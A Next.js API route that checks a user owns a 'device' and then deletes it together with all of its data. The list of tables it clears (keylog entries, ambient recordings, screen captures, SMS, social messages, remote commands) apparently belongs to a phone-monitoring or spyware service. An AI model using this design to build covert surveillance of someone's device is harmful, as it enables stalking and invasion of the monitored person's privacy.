import { NextResponse } from "next/server"
import { createAdminConfig } from "@/lib/utils/api-helpers"
import { createServerClient } from "@supabase/ssr"
import { cookies } from "next/headers"

export async function DELETE(req: Request, { params }: { params: Promise<{ id: string }> }) {
  try {
    const { id } = await params;
    if (!id) return NextResponse.json({ error: "No device ID provided" }, { status: 400 })

    const cookieStore = await cookies()
    const supabase = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
      {
        cookies: {
          get(name: string) { return cookieStore.get(name)?.value },
        },
      }
    )

    // Verify user is authorized
    const { data: { user }, error: authError } = await supabase.auth.getUser()
    if (authError || !user) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
    }

    const supabaseAdmin = createAdminConfig()

    // Double check ownership using admin client to bypass RLS issues in Next.js route handlers
    const { data: device, error: devErr } = await supabaseAdmin
      .from("devices")
      .select("id, user_id")
      .eq("id", id)
      .single()

    if (devErr || !device || device.user_id !== user.id) {
      console.error("Device fetch error or mismatch:", devErr?.message, "Device user:", device?.user_id, "Auth user:", user.id)
      return NextResponse.json({ error: "Not found or not authorized to delete this device" }, { status: 403 })
    }

    // 1. Manually cascade delete all associated tracked data across all tables just to be 100% sure
    const childTables = [
      "sms_messages", "call_logs", "locations", "contacts",
      "installed_apps", "app_usage", "media_files", "social_messages",
      "browser_history", "browser_bookmarks", "keylog_entries", "calendar_events",
      "emails", "wifi_networks", "notification_logs", "sim_changes",
      "screen_captures", "ambient_recordings", "file_explorer",
      "remote_commands", "alerts", "device_settings"
    ]

    for (const table of childTables) {
      await supabaseAdmin.from(table).delete().eq("device_id", id)
    }

    // 2. Finally, delete the device itself
    const { error: deleteDevError } = await supabaseAdmin.from("devices").delete().eq("id", id)

    if (deleteDevError) {
      throw new Error(`Failed to delete root device record: ${deleteDevError.message}`)
    }

    return NextResponse.json({ success: true, message: "Device and all associated data permanently erased." })
  } catch (err: any) {
    console.error("Device delete API failed:", err)
    return NextResponse.json({ error: "Failed to erase device completely" }, { status: 500 })
  }
}
